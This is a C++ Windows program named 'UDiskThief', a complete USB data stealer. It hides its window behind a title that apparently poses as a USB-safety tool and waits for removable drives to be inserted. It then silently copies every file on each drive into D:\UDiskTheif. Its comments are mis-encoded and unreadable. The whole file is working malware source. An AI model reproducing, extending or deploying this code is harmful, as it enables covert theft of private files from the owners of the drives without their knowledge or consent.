#include <Windows.h>
#include <Dbt.h>
#include <stdio.h> 
using namespace std;
#include "resource.h"

//�����߳̾��
HANDLE	g_hThreadCopy = NULL;

//������Ŀ�ĵ�·��
TCHAR	g_szDestPath[MAX_PATH] = "D:\\UDiskTheif";

//��ȡ��ǰ�����豸��Ӧ���̱�� A--Z
char FirstDriveFromMask(ULONG unitMask);

//�ж�·���Ƿ����
BOOL IsDirectoryExist(LPCTSTR strPath);

// ���������ļ��߳�
HANDLE StartCopyThread(char* szRootPath);

// ֹͣ�����̺߳���
void StopCopyThread();

//�߳̿�������
DWORD WINAPI CopyDataProc(LPVOID lpParam);

//����ָ��·���������ļ�
void Copy(char *lpszSourcePath, char *lpszDestPath);

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(
	HINSTANCE hInstance,		//��ǰ�������е�ʵ�������ÿ����һ�β���ϵͳ�����һ�����ֵ
	HINSTANCE hPrevInstance,	//��ǰʵ����ǰһ��ʵ�����
	LPSTR lpCmdLine,			//�����в���
	int nCmdShow)				//������ʾ��ʽ
{
	TCHAR szAppClassName[] = TEXT("UDiskThief");
	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
	wndClass.hInstance = hInstance;
	wndClass.lpfnWndProc = WindowProc;
	wndClass.lpszClassName = szAppClassName;
	wndClass.lpszMenuName = NULL;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;//

	RegisterClass(&wndClass);

	//�������ڣ�������ͨ���������ʶ
	HWND hWnd = CreateWindow(szAppClassName, TEXT("U�̰�ȫ"), WS_OVERLAPPEDWINDOW, 200, 200, 300, 150, NULL, NULL, hInstance, NULL);

	if (hWnd == NULL)
	{
		MessageBox(NULL, TEXT("��������ʧ��"), TEXT("��ʾ"), MB_ICONERROR | MB_OK);
		return 0;
	}


	ShowWindow(hWnd, SW_HIDE);
	UpdateWindow(hWnd);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);	//���������ϢתΪ�ַ���Ϣ
		DispatchMessage(&msg);	//�ַ���Ϣ�����ڻص�����������Ϣ�ش�������ϵͳ
	}
	return 0;
}

//���ڴ���ص�����
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static PAINTSTRUCT ps;
	TCHAR *pszRootPath = NULL;
	switch (uMsg)
	{
	case WM_PAINT:
	{
		EndPaint(hWnd, &ps);
	}
	return TRUE;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		delete[] pszRootPath;//�ͷ��ڴ�
		PostQuitMessage(0);
		break;
	case WM_DEVICECHANGE:
		switch (wParam)
		{
			//�Ѳ������������ҿ���ʹ��
		case DBT_DEVICEARRIVAL:
		{
			//lParam ָ��ṹ���ָ�룬��ʶ������豸
			DEV_BROADCAST_HDR* lpdb = (DEV_BROADCAST_HDR*)lParam;
			//��Ȼ���߼�����ȡ�̷�����
			DEV_BROADCAST_VOLUME* lpdbv = (DEV_BROADCAST_VOLUME*)lpdb;
			char chDisk = FirstDriveFromMask(lpdbv->dbcv_unitmask);

			pszRootPath = new TCHAR[MAX_PATH];
			wsprintf(pszRootPath, "%c:", chDisk);

			//�ж����������� ���ƶ��豸
			if (DRIVE_REMOVABLE == GetDriveType(pszRootPath))
			{
				Sleep(500);
				//������ʼ�����߳�
				g_hThreadCopy = StartCopyThread(pszRootPath);
			}
			return TRUE;
		}
		//�豸�ѱ�ɾ��
		case DBT_DEVICEREMOVECOMPLETE:
			StopCopyThread();
			return TRUE;
		}
		return TRUE;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// ��ȡ��ǰ�����豸��Ӧ���̱�� A--Z
char FirstDriveFromMask(ULONG unitMask)
{
	char i;
	for (i = 0; i < 32; i++)
	{
		if (unitMask & 1)
			break;
		unitMask = unitMask >> 1;
	}
	return i + 'A';
}

//�ж�Ŀ¼�Ƿ����
BOOL IsDirectoryExist(LPCTSTR lpszPath)
{
	//��ȡָ���ļ���Ŀ¼���ļ�ϵͳ���ԡ�ʧ�ܷ��أ�INVALID_FILE_ATTRIBUTES
	DWORD dwFileAttr = ::GetFileAttributes(lpszPath);

	if (dwFileAttr == INVALID_FILE_ATTRIBUTES)
		return FALSE;
	if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY)
		return TRUE;
	else
		return FALSE;
}

// ���������ļ��߳�
HANDLE StartCopyThread(char* szRootPath)
{
	StopCopyThread();

	//�����̵߳Ļ����ϴ���һ�����߳�
	return CreateThread(
		NULL,		//�̰߳�ȫ����
		NULL,		//��ջ�ĳ�ʼ��С�����ֽ�Ϊ��λ���� ���Ϊ0�������߳�ʹ�ÿ�ִ���ļ���Ĭ�ϴ�С��
		CopyDataProc,	//�̺߳�������ʼ��ַ
		szRootPath,	//���ݸ��̵߳Ĳ���ָ��
		NULL,		//�̴߳�����ʶ
		NULL);		//�߳�ID	 
}

// ֹͣ�����̺߳���
void StopCopyThread()
{
	if (g_hThreadCopy)
	{
		CloseHandle(g_hThreadCopy);
		g_hThreadCopy = NULL;
	}
}

//�߳̿�������
DWORD WINAPI CopyDataProc(LPVOID lpParam)
{
	char *szRootPath = (char*)lpParam;
	//��ʼ����
	Copy(szRootPath, g_szDestPath);
	StopCopyThread();
	return 0;
}


//����ָ��·���������ļ�
void Copy(char *lpszSourcePath, char *lpszDestPath)
{
	//������Ŀ�ĵ�,�ж�·���Ƿ����
	if (!IsDirectoryExist(lpszDestPath))
	{
		//����·��
		SECURITY_ATTRIBUTES sa = { 0 };
		CreateDirectory(lpszDestPath, &sa);
	}

	//���ҵ����������͵��ļ�*.*
	TCHAR szSourceFindPath[MAX_PATH];
	strcpy_s(szSourceFindPath, lpszSourcePath);
	strcat_s(szSourceFindPath, "\\*.*");     //�ļ������԰���ͨ����������Ǻţ�*�����ʺţ�������

	WIN32_FIND_DATA FindFileData = { 0 };	//�洢�ļ���Ŀ¼����Ϣ

	HANDLE hFinder = ::FindFirstFile(szSourceFindPath, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFinder)
	{
		return;
	}
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			//���Ϊ�ļ��� ����. ����..
			if (FindFileData.cFileName[0] != '.')
			{
				//�ݹ����Դ·��
				TCHAR szSourcePath[MAX_PATH];
				strcpy_s(szSourcePath, lpszSourcePath);
				strcat_s(szSourcePath, "\\");
				strcat_s(szSourcePath, FindFileData.cFileName);

				//�洢�����ش���·��
				TCHAR szDestPath[MAX_PATH];
				strcpy_s(szDestPath, lpszDestPath);
				strcat_s(szDestPath, "\\");
				strcat_s(szDestPath, FindFileData.cFileName);

				//�ݹ����
				Copy(szSourcePath, szDestPath);
			}
		}
		else
		{
			//�µ��ļ�
			char szNewFileName[MAX_PATH];
			char szUsbFileName[MAX_PATH];

			wsprintf(szNewFileName, "%s\\%s", lpszDestPath, FindFileData.cFileName);
			wsprintf(szUsbFileName, "%s\\%s", lpszSourcePath, FindFileData.cFileName);

			CopyFile(szUsbFileName, szNewFileName, TRUE);
		}
		if (!FindNextFile(hFinder, &FindFileData))
			break;
	}
	FindClose(hFinder);
}